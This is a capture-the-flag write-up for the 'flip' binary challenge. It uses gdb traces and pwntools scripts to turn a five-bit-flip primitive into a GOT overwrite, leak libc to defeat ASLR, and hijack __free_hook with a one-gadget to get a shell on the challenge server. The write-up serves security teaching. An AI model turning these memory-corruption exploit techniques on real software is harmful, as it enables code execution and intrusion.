# Are You Flipping Kidding Me?

Let's start by running the binary and see what we're dealing with.

```bash
$ ./flip
Welcome! The current time is Wed Jan  9 19:20:38 2019

I'll let you flip 5 bits, but that's it!
Enter addr:bit to flip: 0xdeadbeef
[1]    8325 segmentation fault (core dumped)  ./flip
```

Okay... So from the command output, it looks like we can flip a certain bit at
an address of our choosing. Let's check with gdb to see if this is the case.

```bash
$ gdb ./flip 
Reading symbols from ./flip...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/user/tghack/flip/flip 
Welcome! The current time is Wed Jan  9 19:22:19 2019

I'll let you flip 5 bits, but that's it!
Enter addr:bit to flip: 0xdeadbeef:0

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0xdeadbeef 
RBX: 0x0 
RCX: 0x0 
RDX: 0x7ffff7dd18d0 --> 0x0 
RSI: 0x2 
RDI: 0x7fffffffd960 --> 0x6565626461650030 ('0')
RBP: 0x7fffffffdec0 --> 0x7fffffffdef0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdea0 --> 0x1800000002 
RIP: 0x400a25 (<do_flip+101>:	mov    cl,BYTE PTR [rax])
R8 : 0x0 
R9 : 0x0 
R10: 0x7ffff7b82cc0 --> 0x2000200020002 
R11: 0x400b8f --> 0x4c3b031b0100 
R12: 0x400770 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfd0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400a17 <do_flip+87>:	mov    edi,0x1
   0x400a1c <do_flip+92>:	call   0x400760 <exit@plt>
   0x400a21 <do_flip+97>:	mov    rax,QWORD PTR [rbp-0x10]
=> 0x400a25 <do_flip+101>:	mov    cl,BYTE PTR [rax]
   0x400a27 <do_flip+103>:	mov    BYTE PTR [rbp-0x15],cl
   0x400a2a <do_flip+106>:	mov    cl,BYTE PTR [rbp-0x14]
   0x400a2d <do_flip+109>:	mov    edx,0x1
   0x400a32 <do_flip+114>:	shl    edx,cl
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea0 --> 0x1800000002 
0008| 0x7fffffffdea8 --> 0x0 
0016| 0x7fffffffdeb0 --> 0xdeadbeef 
0024| 0x7fffffffdeb8 --> 0xf973ab31f36a7b00 
0032| 0x7fffffffdec0 --> 0x7fffffffdef0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffdec8 --> 0x40098b (<main+75>:	mov    eax,DWORD PTR [rbp-0x8])
0048| 0x7fffffffded0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
0056| 0x7fffffffded8 --> 0x400770 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400a25 in do_flip ()
gdb-peda$ i r rax
rax            0xdeadbeef	0xdeadbeef
gdb-peda$ i r cl
cl             0x0	0x0
```

We see that the program crashes when it tries to dereference `rax` which
contains the address that we supplied. Let's try to flip a bit at a known
address. In the snippet below, we are using the first address of the rw segment
of program memory (`0x601000`).

```bash
$ gdb ./flip
Reading symbols from ./flip...(no debugging symbols found)...done.
gdb-peda$ b *0x400a25
Breakpoint 1 at 0x400a25
gdb-peda$ r
Starting program: /home/user/tghack/flip/flip
Welcome! The current time is Wed Jan  9 19:26:17 2019

I'll let you flip 5 bits, but that's it!
Enter addr:bit to flip: 0x601000:1

[----------------------------------registers-----------------------------------]
RAX: 0x601000 --> 0x600e20 --> 0x1
RBX: 0x0
RCX: 0x0
RDX: 0x7ffff7dd18d0 --> 0x0
RSI: 0x2
RDI: 0x7fffffffd960 --> 0x30303031300031 ('1')
RBP: 0x7fffffffdec0 --> 0x7fffffffdef0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdea0 --> 0x1800000002
RIP: 0x400a25 (<do_flip+101>:	mov    cl,BYTE PTR [rax])
R8 : 0x0
R9 : 0x0
R10: 0x7ffff7b82cc0 --> 0x2000200020002
R11: 0x400b8f --> 0x4c3b031b0100
R12: 0x400770 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfd0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400a17 <do_flip+87>:	mov    edi,0x1
   0x400a1c <do_flip+92>:	call   0x400760 <exit@plt>
   0x400a21 <do_flip+97>:	mov    rax,QWORD PTR [rbp-0x10]
=> 0x400a25 <do_flip+101>:	mov    cl,BYTE PTR [rax]
   0x400a27 <do_flip+103>:	mov    BYTE PTR [rbp-0x15],cl
   0x400a2a <do_flip+106>:	mov    cl,BYTE PTR [rbp-0x14]
   0x400a2d <do_flip+109>:	mov    edx,0x1
   0x400a32 <do_flip+114>:	shl    edx,cl
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdea0 --> 0x1800000002
0008| 0x7fffffffdea8 --> 0x100000000
0016| 0x7fffffffdeb0 --> 0x601000 --> 0x600e20 --> 0x1
0024| 0x7fffffffdeb8 --> 0x8c1b29ec88f59900
0032| 0x7fffffffdec0 --> 0x7fffffffdef0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffdec8 --> 0x40098b (<main+75>:	mov    eax,DWORD PTR [rbp-0x8])
0048| 0x7fffffffded0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
0056| 0x7fffffffded8 --> 0x400770 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400a25 in do_flip ()
gdb-peda$ x/a 0x601000
0x601000:	0x600e20
gdb-peda$ fin
Run till exit from #0  0x0000000000400a25 in do_flip ()

[----------------------------------registers-----------------------------------]
RAX: 0x8c1b29ec88f59900
RBX: 0x0
RCX: 0x22 ('"')
RDX: 0x2
RSI: 0x22 ('"')
RDI: 0x8c1b29ec88f59900
RBP: 0x7fffffffdef0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffded0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
RIP: 0x40098b (<main+75>:	mov    eax,DWORD PTR [rbp-0x8])
R8 : 0x0
R9 : 0x0
R10: 0x7ffff7b82cc0 --> 0x2000200020002
R11: 0x400b8f --> 0x4c3b031b0100
R12: 0x400770 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfd0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40097c <main+60>:	cmp    DWORD PTR [rbp-0x8],0x5
   0x400980 <main+64>:	jge    0x400999 <main+89>
   0x400986 <main+70>:	call   0x4009c0 <do_flip>
=> 0x40098b <main+75>:	mov    eax,DWORD PTR [rbp-0x8]
   0x40098e <main+78>:	add    eax,0x1
   0x400991 <main+81>:	mov    DWORD PTR [rbp-0x8],eax
   0x400994 <main+84>:	jmp    0x40097c <main+60>
   0x400999 <main+89>:	movabs rdi,0x400b1e
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffded0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
0008| 0x7fffffffded8 --> 0x400770 (<_start>:	xor    ebp,ebp)
0016| 0x7fffffffdee0 --> 0x3700000029 (')')
0024| 0x7fffffffdee8 --> 0x0
0032| 0x7fffffffdef0 --> 0x400a70 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffdef8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0048| 0x7fffffffdf00 --> 0x1
0056| 0x7fffffffdf08 --> 0x7fffffffdfd8 --> 0x7fffffffe323 ("/home/call/tghack/flip/flip")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000040098b in main ()
gdb-peda$ x/a 0x601000
0x601000:	0x600e22
```

We put a breakpoint at the same place where we got a segfault the last time.
After running `fin` to finish the function, we can see that the value at
`0x601000` changed from `0x600e20` to `0x600e22` which is what we expected to
see when flipping bit 1 from 0 to 1.

Even though we can flip arbitrary bits in memory, it's not obvious what the best
exploitation strategy is, since we're limited to 5 bit flips. In addition, we
can only flip bits in writable memory. Because of ASLR, we can't flip a bunch of
bits in libc without having an info leak first.

Our first goal, however, is to turn our bit flip primitive into an arbitrary
write. If we take a look at the disassembly of `main()`, we see that it ends
with a call to `exit()`:
```
   0x0000000000400940 <+0>:	push   rbp
   0x0000000000400941 <+1>:	mov    rbp,rsp
   0x0000000000400944 <+4>:	sub    rsp,0x20
   0x0000000000400948 <+8>:	movabs rdi,0x6010b0
   0x0000000000400952 <+18>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000400959 <+25>:	call   0x4006e0 <puts@plt>
   0x000000000040095e <+30>:	movabs rdi,0x400af4
   0x0000000000400968 <+40>:	mov    DWORD PTR [rbp-0xc],eax
   0x000000000040096b <+43>:	mov    al,0x0
   0x000000000040096d <+45>:	call   0x400710 <printf@plt>
   0x0000000000400972 <+50>:	mov    DWORD PTR [rbp-0x8],0x0
   0x0000000000400979 <+57>:	mov    DWORD PTR [rbp-0x10],eax
   0x000000000040097c <+60>:	cmp    DWORD PTR [rbp-0x8],0x5
   0x0000000000400980 <+64>:	jge    0x400999 <main+89>
   0x0000000000400986 <+70>:	call   0x4009c0 <do_flip>
   0x000000000040098b <+75>:	mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040098e <+78>:	add    eax,0x1
   0x0000000000400991 <+81>:	mov    DWORD PTR [rbp-0x8],eax
   0x0000000000400994 <+84>:	jmp    0x40097c <main+60>
   0x0000000000400999 <+89>:	movabs rdi,0x400b1e
   0x00000000004009a3 <+99>:	mov    al,0x0
   0x00000000004009a5 <+101>:	call   0x400710 <printf@plt>
   0x00000000004009aa <+106>:	xor    edi,edi
   0x00000000004009ac <+108>:	mov    DWORD PTR [rbp-0x14],eax
   0x00000000004009af <+111>:	call   0x400760 <exit@plt>
```

We need information about exit in the global offset table (GOT) and plt:
```bash
$ readelf --relocs flip | grep exit
000000601068  000d00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```

`exit@GOT` is located at 0x601068, which contains the value 0x400766
(`exit@plt+6`). With some trial and error of flipping bits, we can see that this address is very
similar to the address of `_start()`: `0x400770`. The `_start()` function is the entry point
of the program, so by executing it, we restart the program. We can count the number of
different bits like this:

```python
>>> bin(0x400766 ^ 0x400770)[2:].count("1")
3
```

We can now start to create a generic arbitrary write function:
```python
def find_bit_flips(a, b):
	tmp = bytearray(bin(a ^ b)[2:][::-1])
	ret = []

#print "a: {}".format(bin(a))
#print "b: {}".format(bin(b))
#print tmp
	while True:
		try:
			i = tmp.index("1")
			ret.append(i)
			tmp[i] = "0"
		except ValueError:
			break

	return ret


def arbitrary_write(addr, value, old_value):
	flips = find_bit_flips(old_value, value)
	for flip in flips[::-1]:
		addr2 = addr + (flip / 8)
		flip2 = flip % 8
		r.recvuntil("to flip: ")
		r.sendline("{:#x}:{}".format(addr2, flip2))
```

This function will work the first time we try to flip bits as well, since we
need less than 5 flips.

Here's the first part of the code:
```python
binary = "./flip"
r = process(binary)
elf = ELF(binary)

exit = elf.plt["exit"] + 6
log.info("exit: {:#x}".format(exit))
target = elf.symbols["_start"]

arbitrary_write(elf.got["exit"], target, exit)
```

Now, we need to figure out how to get arbitrary code execution. As we could see
on the disassembly above, the binary doesn't really have that much
functionality. However, we know that the binary starts by printing the current
time. This is actually implemented in a constructor called `initialize()`.

By looking at the disassembly, we see that the function looks something like
this:
```C
static void __attribute__((constructor)) initialize(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	alarm(40);

	snprintf(buf, 0x7f, welcome_str, asctime(localtime(time(NULL))));
}
```

`buf` is probably 0x80 bytes large. This buffer is printed in `main()`, so we
can use this to get an info leak. We do this by changing the `welcome_str`
pointer, thus controlling what is written into `buf`.

One problem that showed up early when trying to change different pointers, etc.,
was that the pointers ended up pointing to invalid data while flipping bits.
So some pointers need to be changed with only 5 bit flips, before they are
used again when the code returns back to `_start()`.

We added a `flip_count` variable and the following function to "pad" with
useless bit flips:
```python
# we need to pad our flips when changing functions that will be called during
# the next "round"
def pad_flips():
	global flip_count
	for i in range(5 - (flip_count % 5)):
		r.recvuntil("to flip: ")
		r.sendline("{:#x}:{}".format(elf.got["__stack_chk_fail"], 0))
```

Here's the Python solution script for our info leak:
```python
welcome_str = elf.symbols["welcome_str"]
welcome_str_addr = 0x400b51
target = elf.got["puts"]
arbitrary_write(welcome_str, target, welcome_str_addr)
pad_flips()

r.recvuntil("Have a nice day :)\n")
leak = u64(r.recvline()[:-1].ljust(8, "\x00"))
log.info("leak: {:#x}".format(leak))
libc_base = leak - libc.symbols["puts"]
log.success("libc base: {:#x}".format(libc_base))
```

Let's run the code and see what happens:
```bash
$ python2 solve.py 
[+] Starting local process './flip': pid 11965
[*] '/home/user/flip'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/user/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] exit: 0x400766
[*] leak: 0x7f53f8df69c0
[+] libc base: 0x7f53f8d76000
```

Woop woop! We can now flip bits over and over again, and we have defeated ASLR.
After a lot of trial and error trying to find bitflips that we can use to turn
`__free_hook()` into something that will give us arbitrary code execution, the
following plan emerges:
1. change `asctime()` into a nop
2. change `localtime()` into a nop
3. change `__free_hook()` into a one-shot gadget
4. change `localtime()` back

The next time the program calls `initialize()`, `localtime()` will trigger a
call to `free()`, which in turn calls the
[one-shot gadget](https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html).
To turn `asctime()` and `localtime()` into nops, we found some nearby addresses
that contained a `ret` instruction.

Here's the last part of the code:
```python
# turn asctime into a nop to avoid crashes because we've turned
# localtime into a nop
ret = libc_base + libc.symbols["asctime"] - 0x2c
arbitrary_write(elf.got["asctime"], ret, libc_base + libc.symbols["asctime"])
pad_flips()

# turn localtime into a nop to avoid calls to free() while we're
# overwriting __free_hook
ret = libc_base + libc.symbols["localtime"] - 0x60
arbitrary_write(elf.got["localtime"], ret, libc_base + libc.symbols["localtime"])

# now we can safely overwrite __free_hook without any crashes
arbitrary_write(libc_base + libc.symbols["__free_hook"], one_gadgets[2], 0x00)
pad_flips()

# now we can fix up localtime so that it ends up calling free(), which in turn
# will call our selected one_gadget through __free_hook
arbitrary_write(elf.got["localtime"], libc_base + libc.symbols["localtime"], ret)
r.recvuntil("to flip: ")

r.sendline("0x601010:8") # trigger early exit with invalid bit position
log.success("enjoy your shell! <3")

r.interactive()
```

The complete code can be found [here](src/solve.py).

Let's get that flag!
```bash
$ python2 solve.py flip.tghack.no 1947
[+] Opening connection to flip.tghack.no on port 1947: Done
[*] '/home/user/flip'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/user/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] exit: 0x400766
[*] leak: 0x7f77f894b9c0
[+] libc base: 0x7f77f88cb000
[+] enjoy your shell! <3
[*] Switching to interactive mode
$ cat flag.txt
TG19{you_think_this_is_some_kind_of_motherflippin_joke}
```
